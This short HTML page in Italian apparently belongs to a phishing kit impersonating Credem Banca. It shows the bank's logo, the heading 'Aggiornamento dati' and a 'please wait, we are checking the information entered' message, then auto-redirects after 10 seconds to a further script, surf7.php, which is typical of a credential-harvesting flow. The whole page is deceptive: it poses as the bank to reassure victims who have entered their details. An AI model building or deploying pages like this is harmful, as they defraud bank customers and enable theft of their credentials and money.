<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">


<html>


<head>


<title>Credem Aggiornamento </title>


<meta name="viewport" content="width=device-width, initial-scale=1.0">


<link rel="shortcut icon" href="images/favicon.ico"/>


<html><meta http-equiv="Refresh" content="10; url=surf7.php"></html>


</head>


<body>





<h2 style="text-align: center;"><img style="display: block; margin-left: auto; margin-right: auto;" src="https://www.bitmat.it/wp-content/uploads/2018/10/LOGOcredem-banca.png" alt="" width="335" height="251" />Aggiornamento dati</h2>


<center>
<div id="image5"<img style="display: block; margin-left: auto; margin-right: auto; z-index:4"><img src="images/st.gif" alt="" title="" border=0 width=90 height=90></div>
</cernter>
<center>Attendere prego stiamo controllando le informazioni inserite.




</body>


</html>